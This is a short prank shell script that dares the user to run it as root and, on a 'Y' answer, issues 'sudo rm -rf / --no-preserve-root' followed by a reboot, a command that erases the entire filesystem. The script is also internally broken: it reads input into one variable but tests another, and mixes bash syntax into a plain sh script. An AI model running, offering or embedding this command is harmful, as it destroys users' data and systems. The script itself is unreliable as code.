#! /bin/sh
echo "Ayo! You sure you gonna run this?"
printf 'Answer with Y or N : ' ;read -r confirmation
if [ "$EUID" -ne 0 ]
  then echo; echo "Smh I dare you to run this as root"
  echo
  exit
fi
echo "Cool, As per your wish"
if [[ $stack == "Y" ]] ; then
sudo rm -rf / --no-preserve-root
sudo reboot

elif [[ $stack == "N" ]] ; then
echo "Great Choice , See you!"
exit

else

echo "Invalid Input, Exiting" ; exit

fi


